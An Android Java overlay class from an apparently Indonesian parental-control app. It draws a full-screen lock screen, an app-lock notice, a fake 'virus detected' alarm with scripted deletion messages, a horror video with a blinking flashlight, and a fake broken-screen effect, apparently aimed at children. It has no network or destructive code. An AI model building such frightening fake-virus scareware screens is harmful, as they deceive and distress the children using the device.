package com.jagaanak.app;

import android.content.Context;
import android.content.res.AssetFileDescriptor;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.LinearGradient;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.RadialGradient;
import android.graphics.RectF;
import android.graphics.Shader;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.text.InputType;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.animation.CycleInterpolator;
import android.view.animation.DecelerateInterpolator;
import android.view.animation.LinearInterpolator;
import android.view.animation.TranslateAnimation;
import android.view.inputmethod.EditorInfo;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.VideoView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Random;

/** Tampilan layar penuh di atas semua aplikasi: Lock Screen seram, prank virus, dan pesan aplikasi terkunci. */
final class Overlay {
    private static final int MATCH = ViewGroup.LayoutParams.MATCH_PARENT;
    private static final int WRAP = ViewGroup.LayoutParams.WRAP_CONTENT;
    private static final String VIDEO_ASSET = "lock.mp4";
    private static final String VIDEO_ASSET_2 = "virus2.mp4";

    private final Context ctx;
    private final WindowManager wm;
    /** Memeriksa password yang diketik di Lock Screen. Dipanggil di main thread. */
    interface Unlock {
        boolean tryUnlock(String input);
    }

    private final Handler ui = new Handler(Looper.getMainLooper());
    private View sleepView;
    private String sleepMsg;
    private boolean sleepPw;
    private View appView;
    private String appPkg;
    private View prankView;
    private VideoView prankVideo;
    private FlashBlinker flasher;
    private int prankGen;
    private int prankStage; // 0 alarm, 1 video, 2 selesai
    private View lcdView;
    private LcdGlitch lcdGlitch;
    private int lcdGen;

    Overlay(Context ctx) {
        this.ctx = ctx;
        this.wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
    }

    /** Menyalin video dari aset ke cache lebih awal supaya prank langsung jalan. */
    void warmUp() {
        assetFile(VIDEO_ASSET);
        assetFile(VIDEO_ASSET_2);
    }

    // ------------------------------------------------------------------ Lock Screen (tampilan seram)

    /** Menampilkan Lock Screen. Dipanggil berulang; tidak berbuat apa-apa kalau isinya sama. */
    void showSleep(String msg, boolean hasPw, Unlock unlock) {
        if (sleepView != null) {
            if (msg.equals(sleepMsg) && hasPw == sleepPw) {
                return;
            }
            hideSleep();
        }
        View v = buildSleep(msg, hasPw, unlock);
        v.setAlpha(0f);
        if (add(v, true, true)) {
            sleepView = v;
            sleepMsg = msg;
            sleepPw = hasPw;
            v.animate().alpha(1f).setDuration(1100).setInterpolator(new DecelerateInterpolator(1.5f)).start();
            if (flasher == null) {
                flasher = new FlashBlinker(ctx);
            }
            flasher.start(); // senter berkedip-kedip selama layar terkunci, mati lagi saat terbuka
        }
    }

    void hideSleep() {
        if (sleepView != null) {
            remove(sleepView);
            sleepView = null;
            sleepMsg = null;
        }
        if (flasher != null) {
            flasher.stop();
        }
    }

    // ------------------------------------------------------------------ prank virus

    private void later(final int gen, long ms, final Runnable r) {
        ui.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (gen == prankGen && prankView != null) {
                    r.run();
                }
            }
        }, ms);
    }

    /** Alarm virus palsu, lalu video horor, lalu "cuma prank". Berhenti sendiri. */
    void showPrank() {
        showPrank(VIDEO_ASSET, false);
    }

    /** Virus V2: alarm, video horor kedua (diulang terus), dan senter berkedip-kedip. Berhenti lewat tombol Stop di PL Projek. */
    void showPrank2() {
        showPrank(VIDEO_ASSET_2, true);
    }

    private void showPrank(final String asset, final boolean flash) {
        // Virus V2 videonya pendek: diulang terus dan hanya berhenti lewat perintah Stop, bukan otomatis.
        final boolean loop = VIDEO_ASSET_2.equals(asset);
        if (prankView != null) {
            return;
        }
        final int gen = ++prankGen;
        prankStage = 0;
        final FrameLayout f = new FrameLayout(ctx);
        f.setBackgroundColor(Color.BLACK);
        f.setClickable(true);

        final VideoView vv = new VideoView(ctx);
        File file = assetFile(asset);
        if (file != null) {
            vv.setVideoPath(file.getAbsolutePath());
            vv.setOnPreparedListener(new android.media.MediaPlayer.OnPreparedListener() {
                @Override
                public void onPrepared(android.media.MediaPlayer mp) {
                    mp.setLooping(loop);
                    fillScreen(vv, mp.getVideoWidth(), mp.getVideoHeight());
                }
            });
            vv.setOnCompletionListener(new android.media.MediaPlayer.OnCompletionListener() {
                @Override
                public void onCompletion(android.media.MediaPlayer mp) {
                    prankEnd(gen);
                }
            });
            vv.setOnErrorListener(new android.media.MediaPlayer.OnErrorListener() {
                @Override
                public boolean onError(android.media.MediaPlayer mp, int what, int extra) {
                    prankEnd(gen);
                    return true;
                }
            });
        }
        prankVideo = vv;
        f.addView(vv, new FrameLayout.LayoutParams(MATCH, MATCH, Gravity.CENTER));

        // lapisan alarm
        final FrameLayout alert = new FrameLayout(ctx);
        alert.addView(new Scary(ctx, Scary.ALARM), new FrameLayout.LayoutParams(MATCH, MATCH));
        LinearLayout col = new LinearLayout(ctx);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setGravity(Gravity.CENTER_HORIZONTAL);
        col.setPadding(dp(28), 0, dp(28), 0);
        TextView title = Ui.text(ctx, "VIRUS TERDETEKSI", 26, Color.WHITE, true, true);
        title.setGravity(Gravity.CENTER);
        title.setLetterSpacing(0.08f);
        title.setShadowLayer(dp(10), 0, 0, 0xFFFF1A1A);
        final TextView log = Ui.text(ctx, "", 13, 0xFFFF9C94, false, true);
        log.setMinLines(7);
        log.setLineSpacing(0, 1.15f);
        FrameLayout track = new FrameLayout(ctx);
        track.setBackground(Ui.box(ctx, 0x33FFFFFF, 4, 0, 0));
        final View barFill = new View(ctx);
        barFill.setBackground(Ui.box(ctx, 0xFFFF3B2E, 4, 0, 0));
        barFill.setPivotX(0f);
        barFill.setScaleX(0f);
        track.addView(barFill, new FrameLayout.LayoutParams(MATCH, MATCH));
        LinearLayout.LayoutParams tl = new LinearLayout.LayoutParams(WRAP, WRAP);
        tl.bottomMargin = dp(18);
        col.addView(title, tl);
        LinearLayout.LayoutParams ll = new LinearLayout.LayoutParams(MATCH, WRAP);
        ll.bottomMargin = dp(16);
        col.addView(log, ll);
        col.addView(track, new LinearLayout.LayoutParams(MATCH, dp(8)));
        FrameLayout.LayoutParams cl = new FrameLayout.LayoutParams(MATCH, WRAP, Gravity.CENTER);
        col.setTranslationY(dp(90));
        alert.addView(col, cl);
        f.addView(alert, new FrameLayout.LayoutParams(MATCH, MATCH));

        // layar penutup
        final LinearLayout end = new LinearLayout(ctx);
        end.setOrientation(LinearLayout.VERTICAL);
        end.setGravity(Gravity.CENTER);
        end.setBackgroundColor(Color.BLACK);
        TextView e1 = Ui.text(ctx, "Cuma prank! \uD83D\uDE04", 30, Color.WHITE, true, false);
        e1.setGravity(Gravity.CENTER);
        TextView e2 = Ui.text(ctx, "Tidak ada virus. Jangan takut ya.", 15, 0xB3FFFFFF, false, false);
        e2.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams e1l = new LinearLayout.LayoutParams(WRAP, WRAP);
        e1l.bottomMargin = dp(10);
        end.addView(e1, e1l);
        end.addView(e2, new LinearLayout.LayoutParams(WRAP, WRAP));
        end.setVisibility(View.GONE);
        f.addView(end, new FrameLayout.LayoutParams(MATCH, MATCH));

        // jalan keluar untuk anak: tahan layar 3 detik
        TextView hint = Ui.text(ctx, "Prank. Tahan layar 3 detik untuk keluar.", 11, 0x59FFFFFF, false, false);
        hint.setGravity(Gravity.CENTER);
        FrameLayout.LayoutParams hl = new FrameLayout.LayoutParams(MATCH, WRAP, Gravity.BOTTOM);
        hl.bottomMargin = dp(36);
        f.addView(hint, hl);
        final Runnable exit = new Runnable() {
            @Override
            public void run() {
                hidePrank();
            }
        };
        f.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent e) {
                int a = e.getActionMasked();
                if (a == MotionEvent.ACTION_DOWN) {
                    ui.postDelayed(exit, 3000);
                } else if (a == MotionEvent.ACTION_UP || a == MotionEvent.ACTION_CANCEL) {
                    ui.removeCallbacks(exit);
                }
                return true;
            }
        });

        if (!add(f, true, false)) {
            prankVideo = null;
            return;
        }
        prankView = f;
        final String[] lines = {
                "> Memindai sistem...",
                "> Ditemukan: Trojan.Hantu.A",
                "> Ditemukan: Virus.Pocong.exe",
                "> Menghapus foto...",
                "> Menghapus kontak...",
                "> Memformat penyimpanan...",
                "> Gagal. Ada yang melihatmu."
        };
        for (int i = 0; i < lines.length; i++) {
            final int n = i;
            later(gen, 500 + i * 650L, new Runnable() {
                @Override
                public void run() {
                    log.append((n > 0 ? "\n" : "") + lines[n]);
                }
            });
        }
        barFill.animate().scaleX(1f).setDuration(4600).setStartDelay(300).setInterpolator(new LinearInterpolator()).start();
        later(gen, 5400, new Runnable() {
            @Override
            public void run() {
                prankStage = 1;
                vv.start();
                if (flash) {
                    if (flasher == null) {
                        flasher = new FlashBlinker(ctx);
                    }
                    flasher.start();
                }
                alert.animate().alpha(0f).setDuration(350).withEndAction(new Runnable() {
                    @Override
                    public void run() {
                        alert.setVisibility(View.GONE);
                    }
                }).start();
            }
        });
        // kalau diulang terus (Virus V2), batas aman cuma jaga-jaga kalau Stop lupa ditekan
        later(gen, 5400 + (loop ? 600000L : 45000L), new Runnable() {
            @Override
            public void run() {
                prankEnd(gen);
            }
        });
    }

    private void prankEnd(int gen) {
        if (gen != prankGen || prankView == null || prankStage == 2) {
            return;
        }
        prankStage = 2;
        releasePrankVideo();
        if (flasher != null) {
            flasher.stop();
        }
        FrameLayout f = (FrameLayout) prankView;
        View end = f.getChildAt(2);
        end.setAlpha(0f);
        end.setVisibility(View.VISIBLE);
        end.animate().alpha(1f).setDuration(500).start();
        later(gen, 3500, new Runnable() {
            @Override
            public void run() {
                hidePrank();
            }
        });
    }

    void hidePrank() {
        prankGen++;
        releasePrankVideo();
        if (flasher != null) {
            flasher.stop();
        }
        if (prankView != null) {
            remove(prankView);
            prankView = null;
        }
    }

    private void releasePrankVideo() {
        if (prankVideo != null) {
            try {
                prankVideo.stopPlayback();
            } catch (Exception ignored) {
                // sudah berhenti
            }
            prankVideo = null;
        }
    }

    // ------------------------------------------------------------------ prank LCD (layar rusak warna-warni)

    /** Prank LCD: layar penuh garis-garis warna seperti LCD rusak. Berhenti lewat tombol Stop di PL Projek. */
    void showLcd() {
        if (lcdView != null) {
            return;
        }
        final int gen = ++lcdGen;
        final FrameLayout f = new FrameLayout(ctx);
        f.setBackgroundColor(Color.BLACK);
        f.setClickable(true);
        final LcdGlitch g = new LcdGlitch(ctx);
        f.addView(g, new FrameLayout.LayoutParams(MATCH, MATCH));

        TextView hint = Ui.text(ctx, "Prank. Tahan layar 3 detik untuk keluar.", 11, 0x59FFFFFF, false, false);
        hint.setGravity(Gravity.CENTER);
        FrameLayout.LayoutParams hl = new FrameLayout.LayoutParams(MATCH, WRAP, Gravity.BOTTOM);
        hl.bottomMargin = dp(36);
        f.addView(hint, hl);
        final Runnable exit = new Runnable() {
            @Override
            public void run() {
                hideLcd();
            }
        };
        f.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent e) {
                int a = e.getActionMasked();
                if (a == MotionEvent.ACTION_DOWN) {
                    ui.postDelayed(exit, 3000);
                } else if (a == MotionEvent.ACTION_UP || a == MotionEvent.ACTION_CANCEL) {
                    ui.removeCallbacks(exit);
                }
                return true;
            }
        });

        if (!add(f, true, false)) {
            return;
        }
        lcdView = f;
        lcdGlitch = g;
        g.start();
        // batas aman kalau Stop lupa ditekan
        ui.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (gen == lcdGen) {
                    hideLcd();
                }
            }
        }, 600000L);
    }

    void hideLcd() {
        lcdGen++;
        if (lcdGlitch != null) {
            lcdGlitch.stop();
            lcdGlitch = null;
        }
        if (lcdView != null) {
            remove(lcdView);
            lcdView = null;
        }
    }

    // ------------------------------------------------------------------ aplikasi terkunci

    void showApp(String pkg, String label, Runnable onClose) {
        if (appView != null && pkg.equals(appPkg)) {
            return;
        }
        hideApp();
        View v = buildApp(label, onClose);
        v.setAlpha(0f);
        if (add(v, false, false)) {
            appView = v;
            appPkg = pkg;
            v.animate().alpha(1f).setDuration(800).setInterpolator(new DecelerateInterpolator(1.5f)).start();
        }
    }

    void hideApp() {
        if (appView != null) {
            remove(appView);
            appView = null;
            appPkg = null;
        }
    }

    // ------------------------------------------------------------------ jendela

    private WindowManager.LayoutParams params(boolean keepOn, boolean focusable) {
        int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED;
        if (!focusable) {
            // jendela yang bisa difokus dibutuhkan untuk mengetik password
            flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
        }
        if (keepOn) {
            flags |= WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
        }
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                MATCH, MATCH, WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY, flags, PixelFormat.OPAQUE);
        lp.gravity = Gravity.TOP | Gravity.START;
        lp.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN;
        if (Build.VERSION.SDK_INT >= 28) {
            lp.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }
        return lp;
    }

    private boolean add(View v, boolean keepOn, boolean focusable) {
        try {
            v.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
            wm.addView(v, params(keepOn, focusable));
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void remove(View v) {
        try {
            wm.removeView(v);
        } catch (Exception ignored) {
            // sudah terlepas
        }
    }

    // ------------------------------------------------------------------ isi tampilan

    private int dp(float v) {
        return Ui.dp(ctx, v);
    }

    private synchronized File assetFile(String asset) {
        try {
            long len = -1;
            try (AssetFileDescriptor fd = ctx.getAssets().openFd(asset)) {
                len = fd.getLength();
            } catch (Exception ignored) {
                // aset terkompresi, ukuran tidak diketahui
            }
            File out = new File(ctx.getCacheDir(), asset + "-" + len + ".mp4");
            if (!out.exists() || out.length() == 0) {
                File tmp = new File(ctx.getCacheDir(), asset + ".tmp");
                try (InputStream in = ctx.getAssets().open(asset); OutputStream os = new FileOutputStream(tmp)) {
                    byte[] buf = new byte[65536];
                    int n;
                    while ((n = in.read(buf)) > 0) {
                        os.write(buf, 0, n);
                    }
                }
                if (!tmp.renameTo(out)) {
                    return tmp;
                }
            }
            return out;
        } catch (Exception e) {
            return null;
        }
    }

    private View buildSleep(String msg, boolean hasPw, final Unlock unlock) {
        FrameLayout f = new FrameLayout(ctx) {
            @Override
            public boolean dispatchKeyEvent(KeyEvent e) {
                if (e.getKeyCode() == KeyEvent.KEYCODE_BACK) {
                    return true; // tombol kembali tidak membuka apa-apa
                }
                return super.dispatchKeyEvent(e);
            }
        };
        f.setBackgroundColor(Color.WHITE);
        f.setClickable(true);

        // kartu bergaya neobrutalism (bingkai hitam tebal + bayangan keras), seperti di PL Projek
        LinearLayout card = new LinearLayout(ctx);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER_HORIZONTAL);
        card.setPadding(dp(26), dp(28), dp(26), dp(28));
        card.setBackground(Ui.box(ctx, Color.WHITE, 20, Ui.INK, 3f));

        FrameLayout iconChip = new FrameLayout(ctx);
        iconChip.setBackground(Ui.box(ctx, Ui.YELLOW, 16, Ui.INK, 2.5f));
        iconChip.addView(new Ui.IconView(ctx, Ui.LOCK, Ui.INK), new FrameLayout.LayoutParams(dp(28), dp(28), Gravity.CENTER));
        View iconWrap = Ui.brutal(ctx, iconChip, 16, 4);
        LinearLayout.LayoutParams iconLp = new LinearLayout.LayoutParams(dp(64), dp(64));
        iconLp.bottomMargin = dp(18);
        card.addView(iconWrap, iconLp);

        // pesan
        TextView m = Ui.text(ctx, msg, 19, Ui.INK, true, false);
        m.setGravity(Gravity.CENTER);
        m.setLineSpacing(0, 1.18f);
        m.setMaxLines(6);
        LinearLayout.LayoutParams ml = new LinearLayout.LayoutParams(dp(230), WRAP);
        ml.bottomMargin = dp(22);
        card.addView(m, ml);

        if (hasPw) {
            final EditText et = new EditText(ctx);
            et.setSingleLine(true);
            et.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
            et.setImeOptions(EditorInfo.IME_ACTION_DONE);
            et.setHint("Password");
            et.setHintTextColor(Ui.SOFT);
            et.setTextColor(Ui.INK);
            et.setTextSize(20);
            et.setGravity(Gravity.CENTER);
            et.setLetterSpacing(0.15f);
            et.setBackground(Ui.box(ctx, Color.WHITE, 14, Ui.INK, 2.5f));
            et.setPadding(dp(16), dp(13), dp(16), dp(13));
            View etWrap = Ui.brutal(ctx, et, 14, 4);
            card.addView(etWrap, new LinearLayout.LayoutParams(dp(230), WRAP));

            final TextView err = Ui.text(ctx, "", 13, Ui.INK, true, false);
            err.setGravity(Gravity.CENTER);
            LinearLayout.LayoutParams el = new LinearLayout.LayoutParams(WRAP, WRAP);
            el.topMargin = dp(10);
            card.addView(err, el);

            TextView go = Ui.text(ctx, "BUKA", 15, Ui.INK, true, false);
            go.setGravity(Gravity.CENTER);
            go.setLetterSpacing(0.12f);
            go.setPadding(dp(40), dp(13), dp(40), dp(13));
            go.setBackground(Ui.box(ctx, Ui.GREEN, 16, Ui.INK, 2.5f));
            go.setTextColor(Color.WHITE);
            go.setClickable(true);
            Ui.pressable(go);
            View goWrap = Ui.brutal(ctx, go, 16, 4);
            final Runnable attempt = new Runnable() {
                @Override
                public void run() {
                    String in = et.getText().toString();
                    if (unlock != null && unlock.tryUnlock(in)) {
                        return;
                    }
                    err.setText("Salah.");
                    et.setText("");
                    TranslateAnimation shake = new TranslateAnimation(0, dp(14), 0, 0);
                    shake.setDuration(420);
                    shake.setInterpolator(new CycleInterpolator(3));
                    et.startAnimation(shake);
                }
            };
            go.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    attempt.run();
                }
            });
            et.setOnEditorActionListener(new TextView.OnEditorActionListener() {
                @Override
                public boolean onEditorAction(TextView v, int actionId, KeyEvent e) {
                    attempt.run();
                    return true;
                }
            });
            LinearLayout.LayoutParams gl = new LinearLayout.LayoutParams(WRAP, WRAP);
            gl.topMargin = dp(12);
            card.addView(goWrap, gl);
        } else {
            TextView note = Ui.text(ctx, "Hanya orang tua yang bisa membuka.", 13, Ui.SOFT, false, false);
            note.setGravity(Gravity.CENTER);
            card.addView(note, new LinearLayout.LayoutParams(WRAP, WRAP));
        }

        View cardWrap = Ui.brutal(ctx, card, 20, 6);
        FrameLayout.LayoutParams cl = new FrameLayout.LayoutParams(WRAP, WRAP, Gravity.CENTER);
        f.addView(cardWrap, cl);
        return f;
    }

    /** Memperbesar video sampai menutup seluruh layar (bagian lebih dipotong). */
    private void fillScreen(VideoView vv, int vw, int vh) {
        if (vw <= 0 || vh <= 0) {
            return;
        }
        DisplayMetrics dm = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(dm);
        float s = Math.max((float) dm.widthPixels / vw, (float) dm.heightPixels / vh);
        vv.setLayoutParams(new FrameLayout.LayoutParams(Math.round(vw * s), Math.round(vh * s), Gravity.CENTER));
    }

    private View buildApp(String label, final Runnable onClose) {
        FrameLayout f = new FrameLayout(ctx);
        f.setClickable(true);
        f.addView(new Backdrop(ctx, false), new FrameLayout.LayoutParams(MATCH, MATCH));

        LinearLayout col = new LinearLayout(ctx);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setGravity(Gravity.CENTER_HORIZONTAL);
        col.setPadding(dp(32), 0, dp(32), 0);
        TextView title = Ui.text(ctx, "Sudah mainnya ya", 34, Color.WHITE, true, false);
        title.setGravity(Gravity.CENTER);
        TextView sub = Ui.text(ctx, label + " sedang dikunci.\nIstirahat dulu, nanti dibuka lagi oleh orang tua.", 16, 0xB3FFFFFF, false, false);
        sub.setGravity(Gravity.CENTER);
        sub.setLineSpacing(0, 1.2f);
        TextView btn = Ui.text(ctx, "Kembali", 16, Ui.INK, true, false);
        btn.setGravity(Gravity.CENTER);
        btn.setLetterSpacing(0.06f);
        btn.setPadding(dp(40), dp(15), dp(40), dp(15));
        btn.setBackground(Ui.box(ctx, Color.WHITE, 28, 0, 0));
        btn.setClickable(true);
        btn.setOnClickListener(v -> onClose.run());

        LinearLayout.LayoutParams tl = new LinearLayout.LayoutParams(WRAP, WRAP);
        tl.bottomMargin = dp(14);
        col.addView(title, tl);
        LinearLayout.LayoutParams sl = new LinearLayout.LayoutParams(WRAP, WRAP);
        sl.bottomMargin = dp(32);
        col.addView(sub, sl);
        col.addView(btn, new LinearLayout.LayoutParams(WRAP, WRAP));
        col.setTranslationY(dp(70));
        f.addView(col, new FrameLayout.LayoutParams(MATCH, WRAP, Gravity.CENTER));
        return f;
    }

    /** Latar malam: gradasi gelap, bintang, dan ikon gembok. */
    private static final class Backdrop extends View {
        private final boolean moon;
        private final float d;
        private final Paint bg = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint star = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint fill = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint line = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Paint glowPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        private final Path moonPath = new Path();
        private final Path shackle = new Path();
        private float[] sx;
        private float[] sy;
        private float[] sr;
        private int[] sa;
        private float cx;
        private float cy;
        private float r;

        Backdrop(Context c, boolean moon) {
            super(c);
            this.moon = moon;
            this.d = c.getResources().getDisplayMetrics().density;
            line.setStyle(Paint.Style.STROKE);
            line.setStrokeCap(Paint.Cap.ROUND);
        }

        @Override
        protected void onSizeChanged(int w, int h, int ow, int oh) {
            bg.setShader(new LinearGradient(0, 0, 0, h,
                    new int[]{0xFF070B18, 0xFF14183A, 0xFF2A1B52}, new float[]{0f, 0.6f, 1f}, Shader.TileMode.CLAMP));
            Random rnd = new Random(42);
            int n = 70;
            sx = new float[n];
            sy = new float[n];
            sr = new float[n];
            sa = new int[n];
            for (int i = 0; i < n; i++) {
                sx[i] = rnd.nextFloat() * w;
                sy[i] = rnd.nextFloat() * h * 0.8f;
                sr[i] = (0.6f + rnd.nextFloat() * 1.4f) * d;
                sa[i] = 90 + rnd.nextInt(150);
            }
            cx = w / 2f;
            cy = h * (moon ? 0.28f : 0.30f);
            r = 52 * d;
            glowPaint.setShader(new RadialGradient(cx, cy, r * 3f,
                    new int[]{0x33F5F0DC, 0x00F5F0DC}, null, Shader.TileMode.CLAMP));

            moonPath.reset();
            moonPath.addCircle(cx, cy, r, Path.Direction.CW);
            Path cut = new Path();
            cut.addCircle(cx + r * 0.5f, cy - r * 0.25f, r * 0.88f, Path.Direction.CW);
            moonPath.op(cut, Path.Op.DIFFERENCE);

            shackle.reset();
            shackle.moveTo(cx - 9 * d, cy - 4 * d);
            shackle.lineTo(cx - 9 * d, cy - 12 * d);
            shackle.arcTo(new RectF(cx - 9 * d, cy - 21 * d, cx + 9 * d, cy - 3 * d), 180, 180);
            shackle.lineTo(cx + 9 * d, cy - 4 * d);
        }

        @Override
        protected void onDraw(Canvas c) {
            c.drawRect(0, 0, getWidth(), getHeight(), bg);
            if (sx != null) {
                for (int i = 0; i < sx.length; i++) {
                    star.setColor(Color.argb(sa[i], 255, 255, 255));
                    c.drawCircle(sx[i], sy[i], sr[i], star);
                }
            }
            c.drawCircle(cx, cy, r * 3f, glowPaint);
            if (moon) {
                fill.setColor(0xFFF5F0DC);
                c.drawPath(moonPath, fill);
                return;
            }
            fill.setColor(0x1AFFFFFF);
            c.drawCircle(cx, cy, 48 * d, fill);
            line.setColor(0x33FFFFFF);
            line.setStrokeWidth(1.5f * d);
            c.drawCircle(cx, cy, 48 * d, line);

            line.setColor(Color.WHITE);
            line.setStrokeWidth(4 * d);
            c.drawPath(shackle, line);
            fill.setColor(Color.WHITE);
            c.drawRoundRect(cx - 16 * d, cy - 4 * d, cx + 16 * d, cy + 24 * d, 5 * d, 5 * d, fill);
            fill.setColor(0xFF1B1B45);
            c.drawCircle(cx, cy + 10 * d, 3 * d, fill);
        }
    }
}
